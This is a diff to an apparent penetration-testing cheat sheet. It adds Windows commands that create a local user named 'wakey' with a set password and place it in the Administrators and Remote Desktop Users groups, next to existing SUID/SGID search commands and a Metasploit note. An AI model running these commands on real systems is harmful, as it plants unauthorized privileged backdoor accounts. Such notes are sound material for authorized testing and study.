@@ -261,6 +261,22 @@ msf>exploit -j
 ```
 The -j option is to keep all the connected session in the background.  
 
+## Priv Escerlation 
+
+#Add accounts on windows 
+```
+net user wakey 26@Wakeywakey /add
+```
+#Add into admin group on windows 
+```
+net localgroup "Administrators" /add wakey
+
+#Add into RDP group on windows 
+```
+net localgroup "Remote Desktop Users" /add wakey
+```
+
+```
 #Find SUID BIT
 ```
 find / -perm -4000 2>/dev/null
@@ -269,6 +285,14 @@ find / -perm -4000 2>/dev/null
 ```
 find / -perm -2000 2>/dev/null
 ```
+
+
+## Living off the Land
+
+```
+
+```
+
 
 # References
 
